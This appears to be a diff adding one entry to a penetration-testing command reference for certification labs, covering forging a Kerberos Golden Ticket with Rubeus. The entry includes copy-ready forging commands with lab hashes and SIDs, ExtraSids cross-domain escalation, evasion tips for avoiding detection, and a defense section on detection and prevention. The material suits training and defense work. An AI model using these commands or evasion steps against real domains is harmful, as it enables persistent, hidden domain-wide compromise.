@@ -1,0 +1,84 @@
+{
+  "id": "ad-golden-ticket-rubeus",
+  "name": "Rubeus - Forge Golden Ticket",
+  "command": ".\\Rubeus.exe golden /rc4:<child_krbtgt_hash> /domain:<child_domain> /sid:<child_sid> /sids:<parent_EA_sid> /user:Administrator /ptt",
+  "description": "Forges a Kerberos Golden Ticket using Rubeus (C# alternative to Mimikatz). /rc4 uses RC4 encryption (KRBTGT NT hash), /ptt injects directly into memory. Supports ExtraSids via /sids for child→parent trust escalation. More AV-evasive than Mimikatz in many environments.",
+  "platform": "windows",
+  "type": "command",
+  "opsec": "loud",
+  "category": "Privilege Escalation",
+  "subcategory": "Domain Trusts",
+  "certifications": [
+    "CPTS",
+    "OSCP",
+    "CRTP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 13: Active Directory Enumeration & Attacks",
+  "tags": [
+    "golden-ticket",
+    "rubeus",
+    "kerberos",
+    "extrasids",
+    "domain-trust"
+  ],
+  "mitre": [
+    "T1558.001"
+  ],
+  "exam": "exam-ok",
+  "notes": "=== RUBEUS vs MIMIKATZ FOR GOLDEN TICKETS ===\n  Mimikatz      → older, more detected by AV, kerberos::golden /ptt\n  Rubeus        → C#, more recently maintained, /ptt or /outfile\n  Both do the same thing: forge TGT signed with KRBTGT hash\n\nRubeus output: creates a .kirbi format ticket that's injected via /ptt\nor saved with /outfile:ticket.kirbi for later use.\n\n=== RUBEUS GOLDEN TICKET FLAGS ===\n  /rc4:         → KRBTGT NT hash (RC4 encryption)\n  /aes256:      → KRBTGT AES256 key (stealthier, AES downgrade detection avoidance)\n  /domain:      → domain FQDN\n  /sid:         → domain SID\n  /sids:        → ExtraSids (parent EA SID for cross-domain)\n  /user:        → username to forge (any string works)\n  /id:          → RID (default 500)\n  /groups:      → group RIDs\n  /ptt          → inject directly\n  /outfile:     → save to .kirbi file\n  /nowrap       → no line wrapping in base64 output\n\n=== USING AES256 FOR STEALTH ===\nIf the DC enforces AES (common in hardened environments), RC4 golden tickets\nmay trigger 'encryption downgrade' detection:\n  .\\Rubeus.exe golden /aes256:<krbtgt_aes256_key> /domain:... /sid:... /ptt\nAES256 key from: lsadump::dcsync /domain:... /user:krbtgt → 'Supplemental Credentials'\n\n=== VERIFY TICKET INJECTED ===\n.\\Rubeus.exe klist     → show current tickets\nor: klist (built-in Windows)\n\n=== ACCESS AFTER INJECTION ===\ndir \\\\ACADEMY-EA-DC01\\C$\nEnter-PSSession -ComputerName ACADEMY-EA-DC01\nnltest /sc_verify:INLANEFREIGHT.LOCAL → confirm secure channel works as DA",
+  "examples": [
+    {
+      "label": "ExtraSids child→parent golden ticket",
+      "command": ".\\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:Administrator /ptt"
+    },
+    {
+      "label": "AES256 golden ticket (stealthier)",
+      "command": ".\\Rubeus.exe golden /aes256:<aes256_key> /domain:INLANEFREIGHT.LOCAL /sid:S-1-5-21-3842939050-3880317879-2865463114 /user:Administrator /ptt"
+    },
+    {
+      "label": "Save to file instead of inject",
+      "command": ".\\Rubeus.exe golden /rc4:<hash> /domain:INLANEFREIGHT.LOCAL /sid:<sid> /user:Administrator /outfile:admin_gold.kirbi"
+    }
+  ],
+  "references": [
+    {
+      "title": "Rubeus (GhostPack)",
+      "url": "https://github.com/GhostPack/Rubeus"
+    },
+    {
+      "title": "HTB Academy - Active Directory Enumeration & Attacks",
+      "url": "https://academy.hackthebox.com/module/details/143"
+    },
+    {
+      "title": "OffSec PEN-200 (OSCP)",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "ad-golden-ticket-mimikatz",
+      "rel": "next",
+      "note": "Leverage trust data for cross-domain forging."
+    }
+  ],
+  "defense": {
+    "why_it_works": "Same underlying Kerberos principle as Mimikatz: Rubeus forges a TGT signed with the KRBTGT account's key material. The KDC validates the TGT by decrypting with KRBTGT — if it decrypts, it is trusted. /sids adds the ExtraSids field with the parent domain's Enterprise Admin SID into the PAC, which the parent DC honours during inter-realm trust referral, granting EA-equivalent privileges. /ptt writes the ticket directly into the LSASS session — no .kirbi file created on disk.",
+    "prerequisites": "KRBTGT NT hash (/rc4) or AES256 key (/aes256) from DCSync. Domain SID and (for ExtraSids) parent domain's EA SID. Windows host with Rubeus binary. Kerberos connectivity to the target domain's DCs.",
+    "impact": "Persistent privileged access identical to Mimikatz golden ticket. ExtraSids variant achieves forest-wide Enterprise Admin access. /aes256 version avoids the RC4 downgrade detection indicator present with /rc4 on AES-enforced domains — harder to detect than the Mimikatz equivalent if AES key is available.",
+    "detection": "Same core indicators as Mimikatz golden ticket: Event 4769 with RC4 encryption (0x17) on AES-enforced domain (only if /rc4 used — /aes256 avoids this), unusual ticket lifetime, Event 4624 with anomalous PAC values. Microsoft Defender for Identity golden ticket detection fires on both Mimikatz and Rubeus variants. Rubeus itself may be flagged by AV/EDR (C# .NET assembly execution).",
+    "artifacts": "Tickets in LSASS memory (klist); Rubeus.exe binary on disk if not run from memory; Event 4624/4672 on accessed systems; Event 4769 with encryption type anomaly if /rc4 used.",
+    "prevention": "Reset KRBTGT password TWICE. Enforce AES-only Kerberos to force attackers to use AES keys (harder to obtain and /aes256 forged tickets generate the same AES-anomaly events if the account has no prior AES usage). MDI for real-time detection. EDR blocking Rubeus or detecting .NET assembly injection into LSASS. SID Filtering between trusts to block ExtraSids.",
+    "evasion": "/aes256: instead of /rc4: eliminates the RC4 downgrade indicator (requires KRBTGT AES key from DCSync supplemental credentials). /ptt injects into memory — no .kirbi file written to disk. Set /endin and /renewmax to match domain ticket policy (8h/7d) rather than the default 10-year lifetime. /user: can be any realistic name — does not need to be Administrator.",
+    "sources": [
+      "HTB M13",
+      "MITRE T1558.001"
+    ],
+    "misconfiguration": "Domain trusts (especially bidirectional and forest trusts) extend authentication boundaries. SID filtering is often disabled on forest trusts to support legacy applications — but this allows an attacker with Domain Admin in a child domain to forge a golden ticket with ExtraSids claiming Domain Admin SID in the parent/trusted forest. Without SID filtering (SIDHistory filtering), domain boundaries offer no security isolation.",
+    "vulnerable_config": "# Bidirectional forest trust without SID filtering:\nGet-ADTrust -Filter * | Select-Object Name, Direction, SIDFilteringQuarantined\n# SIDFilteringQuarantined: False  <-- SID filtering DISABLED\n# Direction: BiDirectional        <-- both domains trust each other\n\n# Child domain to parent: SID filtering is always disabled by default\n# Enterprise Admin SID (S-1-5-21-<root>-519) can be added to ExtraSids\n# Golden ticket with ExtraSids = cross-domain privilege escalation",
+    "secure_config": "# Enable SID filtering on external/forest trusts:\nnetdom trust <TrustingDomain> /domain:<TrustedDomain> /quarantine:yes\n# 'Quarantine' = SID filtering enabled — ExtraSids from other domain are stripped\n\n# For child-to-parent trusts (SID filtering can't be enabled without breaking functionality):\n# Use Selective Authentication instead of full trust\n# Only accounts explicitly granted 'Allowed to Authenticate' can use the trust\nnetdom trust <ParentDomain> /domain:<ChildDomain> /SelectiveAuth:yes\n\n# Restrict SIDHistory (prevents ExtraSids abuse):\n# Audit accounts with SIDHistory:\nGet-ADUser -Filter {SIDHistory -like '*'} -Properties SIDHistory\n\n# Monitor cross-forest authentication:\n# Event 4769 on parent DC with ticket from child domain user"
+  },
+  "tools": [
+    "Rubeus"
+  ]
+}
